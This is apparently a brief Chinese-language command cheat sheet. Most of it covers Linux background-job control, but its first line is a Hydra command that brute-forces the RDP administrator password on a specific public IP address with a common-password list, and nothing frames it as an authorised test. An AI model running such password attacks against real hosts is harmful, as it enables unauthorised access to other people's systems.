#hydra 破解3389端口密码命令
hydra -l administrator -P ./常用密码.txt -f -V 218.28.60.24 rdp
#=================后台执行j程序=======================
jobs          #查看在后台执行的进程
fg %n         #将后台执行进程n调到前台执行，n表示jobnumber（通过jobs查看的进程编号，而非pid）
ctrl+z        #将在前台执行的进程，放到后台并挂起
bg %n         #将在后台挂起的进程，继续执行
ctrl+c        #前台进程终止
kill %n       #杀掉后台运行的进程，n表示jobnumber（通过jobs查看的进程编号，而非pid）
